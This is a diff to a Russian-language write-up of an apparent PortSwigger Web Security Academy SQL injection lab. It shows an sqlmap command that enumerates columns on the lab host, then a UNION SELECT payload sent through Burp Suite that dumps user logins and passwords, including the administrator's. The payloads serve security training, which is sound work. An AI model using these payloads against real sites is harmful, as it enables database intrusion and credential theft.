@@ -27,3 +27,9 @@
 А именно: `information_schema`, `pg_catalog`, `public`. Решил посетить `public`, с помощью такого запроса я узнал колонны в двух дб: s`qlmap -u "https://0a0800c0040222b28008620b0074007e.web-security-academy.net/filter?category=Pets" --batch -D public --columns`.
 
 ![Решения](images/Screenshot_2026-10-04_21_17_46.png)
+
+В `public` мы видем `username` и `password`, которые находятся в `users`, поэтому, если мы перехватим запрос через `BurpSuite`, и изменим запрос на такой: `'+UNION+SELECT+username,password+FROM+users--`:
+
+![Решения](images/Screenshot_2026-10-04_21-31-24.png)
+
+Можем увидеть, что мы смогли вывести пароли и логины пользователей страницы, в том числе и администратора.
